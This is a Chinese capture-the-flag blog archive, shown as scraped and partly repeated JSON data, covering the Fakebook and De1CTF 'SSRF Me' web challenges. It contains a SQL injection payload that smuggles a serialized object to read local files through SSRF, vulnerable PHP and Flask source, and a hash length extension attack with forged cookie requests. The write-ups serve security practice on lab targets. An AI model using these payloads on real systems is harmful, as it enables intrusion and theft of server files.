class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">                file:///var/www/html/flag.php            <span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">table</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">hr</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>the contents of his/her blog<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">hr</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">width</span>=<span class=\"string\">'100%'</span> <span class=\"attr\">height</span>=<span class=\"string\">'10em'</span> <span class=\"attr\">src</span>=<span class=\"string\">'data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s4MzUwNjViNi1iNjBkLTQ5ZGEtYTkyYi1kZDgwZDM4MDMyZGN9IjsNCmV4aXQoMCk7DQo='</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>点击即可看见flag</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">$flag = <span class=\"string\">\"flag&#123;835065b6-b60d-49da-a92b-dd80d38032dc&#125;\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">exit</span>(<span class=\"number\">0</span>);</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<h2 id=\"网鼎杯-2018-Fakebook\"><a href=\"#网鼎杯-2018-Fakebook\" class=\"headerlink\" title=\"[网鼎杯 2018]Fakebook\"></a>[网鼎杯 2018]Fakebook</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者<code>www.zip</code>等一系列文件中出现网站源码。也可以使用工具扫描</p>","more":"<h3 id=\"0x01-分析\"><a href=\"#0x01-分析\" class=\"headerlink\" title=\"0x01 分析\"></a>0x01 分析</h3><p>访问<code>robots.txt</code>，给了一个提示</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-agent: *</span><br><span class=\"line\">Disallow: /user.php.bak</span><br></pre></td></tr></table></figure>\n\n<p>拿到<code>user.php</code>的源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">UserInfo</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $name = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $age = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $blog = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($name, $age, $blog)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;name = $name;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;age = (int)$age;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;blog = $blog;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get</span><span class=\"params\">($url)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $ch = curl_init();   <span class=\"comment\">//初始化链接</span></span><br><span class=\"line\"></span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_URL, $url);     <span class=\"comment\">//设置CURLOPT_URL</span></span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);   <span class=\"comment\">//将curl_exec()获取的信息以文件流的形式返回,而不是直接输出</span></span><br><span class=\"line\">        $output = curl_exec($ch);      /执行CURL会话;此处存在ssrf</span><br><span class=\"line\">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($httpCode == <span class=\"number\">404</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">404</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        curl_close($ch);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> $output;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getBlogContents</span> <span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;get(<span class=\"keyword\">$this</span>-&gt;blog);  <span class=\"comment\">//获取博客地址</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isValidBlog</span> <span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $blog = <span class=\"keyword\">$this</span>-&gt;blog;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> preg_match(<span class=\"string\">\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i\"</span>, $blog);  <span class=\"comment\">//博客地址有过滤</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>访问<code>flag.php</code>，显示返回是200。那么应该是要将<code>./flag.php</code>写入博客地址，让程序加载。</p>\n<p>在加入一个用户时的<code>username</code>存在post注入，加入完成，进入到<code>view.php</code>发现也存在注入</p>\n<h3 id=\"0x02-开始操作\"><a href=\"#0x02-开始操作\" class=\"headerlink\" title=\"0x02 开始操作\"></a>0x02 开始操作</h3><p>使用sqlmap跑了一遍post注入，发现数据库中存的是序列化后结果，应该存在序列化漏洞。</p>\n<p><img src=\"/pic/4.png\" alt=\"\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload&#x3D;view.php?no&#x3D;0&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,&#39;O:8:&quot;UserInfo&quot;:3&#123;s:4:&quot;name&quot;;s:4:&quot;and&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure>\n\n<p>执行结果</p>\n<p><img src=\"/pic/5.png\" alt=\"\"></p>\n<p>查看源码</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!doctype <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"ko\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">\"viewport\"</span></span></span><br><span class=\"line\"><span class=\"tag\">          <span class=\"attr\">content</span>=<span class=\"string\">\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">\"X-UA-Compatible\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"ie=edge\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>User<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"css/bootstrap.min.css\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"js/jquery-3.3.1.slim.min.js\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"js/popper.min.js\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"js/bootstrap.min.js\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"container\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">table</span> <span class=\"attr\">class</span>=<span class=\"string\">\"table\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">                username</span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">                age</span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">                blog</span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">                2            <span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">                12            <span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">                file:///var/www/html/flag.php            <span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">table</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">hr</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>the contents of his/her blog<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">hr</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">width</span>=<span class=\"string\">'100%'</span> <span class=\"attr\">height</span>=<span class=\"string\">'10em'</span> <span class=\"attr\">src</span>=<span class=\"string\">'data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s4MzUwNjViNi1iNjBkLTQ5ZGEtYTkyYi1kZDgwZDM4MDMyZGN9IjsNCmV4aXQoMCk7DQo='</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>点击即可看见flag</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">$flag = <span class=\"string\">\"flag&#123;835065b6-b60d-49da-a92b-dd80d38032dc&#125;\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">exit</span>(<span class=\"number\">0</span>);</span><br></pre></td></tr></table></figure>"},{"title":"buuoj刷题记录4","date":"2019-12-28T13:16:16.000Z","_content":"## [De1CTF 2019]SSRF Me\n\n### 0x00 基础\n\n大致了解flask框架，[CVE-2019-9948](http://www.security-database.com/detail.php?alert=CVE-2019-9948)：`urlopen（）可包含本地文件`，[哈希长度扩展攻击](https://www.freebuf.com/articles/web/31756.html) 。\n\n<!--more-->\n\n### 0x01 分析\n\n题目提示 `flag在./flag.txt中`。\n\n打开链接查看源码，在buuoj的复现过程中，查看源码只拿到一行，需要自己一个一个的敲回车改格式。\n\n\n```python\n#! /usr/bin/env python\n#encoding=utf-8\nfrom flask import Flask\nfrom flask import request\nimport socket\nimport hashlib\nimport urllib\nimport sys\nimport os\nimport json\n\nreload(sys)\nsys.setdefaultencoding('latin1')\n\napp = Flask(__name__)\n\nsecert_key = os.urandom(16)\n\nclass Task:\n    def __init__(self, action, param, sign, ip):\n        self.action = action\n        self.param = param\n        self.sign = sign\n        self.sandbox = md5(ip)\n        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr\n            os.mkdir(self.sandbox)\n\n    def Exec(self):\n        result = {}\n        result['code'] = 500\n        if (self.checkSign()):\n            if \"scan\" in self.action:\n                tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w')\n                resp = scan(self.param)\n                if (resp == \"Connection Timeout\"):\n                    result['data'] = resp\n                else:\n                    print(resp)\n                    tmpfile.write(resp)\n                    tmpfile.close()\n                result['code'] = 200\n            if \"read\" in self.action:\n                f = open(\"./%s/result.txt\" % self.sandbox, 'r')\n                result['code'] = 200\n                result['data'] = f.read()\n            if result['code'] == 500:\n                result['data'] = \"Action Error\"\n        else:\n            result['code'] = 500\n            result['msg'] = \"Sign Error\"\n        return result\n\n    def checkSign(self):\n        if (getSign(self.action, self.param) == self.sign):  #对secert_key、param、action进行MD5运算  的结果与self.sign作比较\n            return True\n        else:\n            return False\n\n#generate Sign For Action Scan.\n@app.route(\"/geneSign\", methods=['GET', 'POST'])\ndef geneSign():\n    param = urllib.unquote(request.args.get(\"param\", \"\"))  # urllib.unquote 相当与  urldecode\n    action = \"scan\"\n    return getSign(action, param)\n\n@app.route('/De1ta',methods=['GET','POST'])\ndef challenge():\n    action = urllib.unquote(request.cookies.get(\"action\"))\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    sign = urllib.unquote(request.cookies.get(\"sign\"))\n    ip = request.remote_addr\n    if(waf(param)):\n        return \"No Hacker!!!!\"\n    task = Task(action, param, sign, ip)\n    return json.dumps(task.Exec())\n@app.route('/')\ndef index():\n    return open(\"code.txt\",\"r\").read()\n\ndef scan(param):\n    socket.setdefaulttimeout(1)\n    try:\n        return urllib.urlopen(param).read()[:50]\n    except:\n        return \"Connection Timeout\"\n\ndef getSign(action, param):\n    return hashlib.md5(secert_key + param + action).hexdigest() #对secert_key、param、action进行MD5摘要签名\n\ndef md5(content):\n    return hashlib.md5(content).hexdigest()\n\ndef waf(param):\n    check=param.strip().lower()\n    if check.startswith(\"gopher\") or check.startswith(\"file\"):\n        return True\n    else:\n        return False\n\nif __name__ == '__main__':\n    app.debug = False\n    app.run(host='0.0.0.0',port=80)\n```\n\n分析代码，总共三条路由，`@app.route('/')`显示代码，`@app.route(\"/geneSign\", methods=['GET', 'POST'])`生成签名，`@app.route('/De1ta',methods=['GET','POST'])`获取参数并执行`Exec()`函数\n\n大概思路就是在 /De1ta 中 get param ，cookie action sign 去读取 flag.txt，其中，`param=flag.txt`，`action` 中要含有 `read` 和 `scan`，且 `sign=md5(secert_key + param + action)`\n\n在`getSign`函数中，生成MD5签名的方式是`secert_key + param + action`其中`action=scan`，`secert_key`未知`param`可以控制。\n\n在`@app.route('/De1ta',methods=['GET','POST'])`中，`cookies`中的`action`必须为`readscan`，sign为\n\n`secert_key + param + scan`签名后的md5，使`param=flag.txtread`直接获取到签名后的md5。\n\n### 0x02 开始操作\n\n先获取到签名后的md5\n\n访问`http://35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn/geneSign?param=flag.txtread`\n\n返回为`0155303824bd0738b4ed0a52b7446c08`\n\n\n```http\nGET /De1ta?param=flag.txt HTTP/1.1\nHost: 35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nCookie: action=readscan; sign=0155303824bd0738b4ed0a52b7446c08 \n```\n\n结果\n\n`{\"code\": 200, \"data\": \"flag{04726554-0f9f-47f4-9c1a-114e21e68594}\\n\"}`\n\n### 0x02 另一种解法\n\n使用hashdump 利用哈希长度扩展攻击，\n\n已知`（secret+flag.txt+scan）=40ad0bf20e771e768e9305810410c1b9`\n\n求`（secret+flag.txt+scanread）`\n\n经过测试密钥是16位 加上scanread是24位。\n\n```bash\nroot@kali:/tmp/HashPump# hashpump \nInput Signature: 40ad0bf20e771e768e9305810410c1b9\nInput Data: scan   #写上原有数据\nInput Key Length: 24    #密钥长度+数据长度+拓展的数据长度\nInput Data to Add: read   #拓展的数据\n46a6ff04f7bede58de30e93410935976 #生成的MD5\nscan\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe0\\x00\\x00\\x00\\x00\\x00\\x00\\x00read \n```\n\n`burp suite`提交的数据\n\n```http\nGET /De1ta?param=flag.txt HTTP/1.1\nHost: 6e84dbce-e560-4f27-86f2-54cb202c45fe.node3.buuoj.cn\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nCookie:action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read;sign=46a6ff04f7bede58de30e93410935976\n\n```\n\n结果`{\"code\": 200, \"data\": \"flag{6cd67cbd-fdfb-45cc-8654-52766ef0635a}\\n\"}`\n\n","source":"_posts/buuoj刷题记录4.md","raw":"---\ntitle: buuoj刷题记录4\ndate: 2019-12-28 21:16:16\ntags:\n - web \n - ctf  \n - buuctf\n - De1CTF\ncategories: \n - 刷题记录\n---\n## [De1CTF 2019]SSRF Me\n\n### 0x00 基础\n\n大致了解flask框架，[CVE-2019-9948](http://www.security-database.com/detail.php?alert=CVE-2019-9948)：`urlopen（）可包含本地文件`，[哈希长度扩展攻击](https://www.freebuf.com/articles/web/31756.html) 。\n\n<!--more-->\n\n### 0x01 分析\n\n题目提示 `flag在./flag.txt中`。\n\n打开链接查看源码，在buuoj的复现过程中，查看源码只拿到一行，需要自己一个一个的敲回车改格式。\n\n\n```python\n#! /usr/bin/env python\n#encoding=utf-8\nfrom flask import Flask\nfrom flask import request\nimport socket\nimport hashlib\nimport urllib\nimport sys\nimport os\nimport json\n\nreload(sys)\nsys.setdefaultencoding('latin1')\n\napp = Flask(__name__)\n\nsecert_key = os.urandom(16)\n\nclass Task:\n    def __init__(self, action, param, sign, ip):\n        self.action = action\n        self.param = param\n        self.sign = sign\n        self.sandbox = md5(ip)\n        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr\n            os.mkdir(self.sandbox)\n\n    def Exec(self):\n        result = {}\n        result['code'] = 500\n        if (self.checkSign()):\n            if \"scan\" in self.action:\n                tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w')\n                resp = scan(self.param)\n                if (resp == \"Connection Timeout\"):\n                    result['data'] = resp\n                else:\n                    print(resp)\n                    tmpfile.write(resp)\n                    tmpfile.close()\n                result['code'] = 200\n            if \"read\" in self.action:\n                f = open(\"./%s/result.txt\" % self.sandbox, 'r')\n                result['code'] = 200\n                result['data'] = f.read()\n            if result['code'] == 500:\n                result['data'] = \"Action Error\"\n        else:\n            result['code'] = 500\n            result['msg'] = \"Sign Error\"\n        return result\n\n    def checkSign(self):\n        if (getSign(self.action, self.param) == self.sign):  #对secert_key、param、action进行MD5运算  的结果与self.sign作比较\n            return True\n        else:\n            return False\n\n#generate Sign For Action Scan.\n@app.route(\"/geneSign\", methods=['GET', 'POST'])\ndef geneSign():\n    param = urllib.unquote(request.args.get(\"param\", \"\"))  # urllib.unquote 相当与  urldecode\n    action = \"scan\"\n    return getSign(action, param)\n\n@app.route('/De1ta',methods=['GET','POST'])\ndef challenge():\n    action = urllib.unquote(request.cookies.get(\"action\"))\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    sign = urllib.unquote(request.cookies.get(\"sign\"))\n    ip = request.remote_addr\n    if(waf(param)):\n        return \"No Hacker!!!!\"\n    task = Task(action, param, sign, ip)\n    return json.dumps(task.Exec())\n@app.route('/')\ndef index():\n    return open(\"code.txt\",\"r\").read()\n\ndef scan(param):\n    socket.setdefaulttimeout(1)\n    try:\n        return urllib.urlopen(param).read()[:50]\n    except:\n        return \"Connection Timeout\"\n\ndef getSign(action, param):\n    return hashlib.md5(secert_key + param + action).hexdigest() #对secert_key、param、action进行MD5摘要签名\n\ndef md5(content):\n    return hashlib.md5(content).hexdigest()\n\ndef waf(param):\n    check=param.strip().lower()\n    if check.startswith(\"gopher\") or check.startswith(\"file\"):\n        return True\n    else:\n        return False\n\nif __name__ == '__main__':\n    app.debug = False\n    app.run(host='0.0.0.0',port=80)\n```\n\n分析代码，总共三条路由，`@app.route('/')`显示代码，`@app.route(\"/geneSign\", methods=['GET', 'POST'])`生成签名，`@app.route('/De1ta',methods=['GET','POST'])`获取参数并执行`Exec()`函数\n\n大概思路就是在 /De1ta 中 get param ，cookie action sign 去读取 flag.txt，其中，`param=flag.txt`，`action` 中要含有 `read` 和 `scan`，且 `sign=md5(secert_key + param + action)`\n\n在`getSign`函数中，生成MD5签名的方式是`secert_key + param + action`其中`action=scan`，`secert_key`未知`param`可以控制。\n\n在`@app.route('/De1ta',methods=['GET','POST'])`中，`cookies`中的`action`必须为`readscan`，sign为\n\n`secert_key + param + scan`签名后的md5，使`param=flag.txtread`直接获取到签名后的md5。\n\n### 0x02 开始操作\n\n先获取到签名后的md5\n\n访问`http://35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn/geneSign?param=flag.txtread`\n\n返回为`0155303824bd0738b4ed0a52b7446c08`\n\n\n```http\nGET /De1ta?param=flag.txt HTTP/1.1\nHost: 35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nCookie: action=readscan; sign=0155303824bd0738b4ed0a52b7446c08 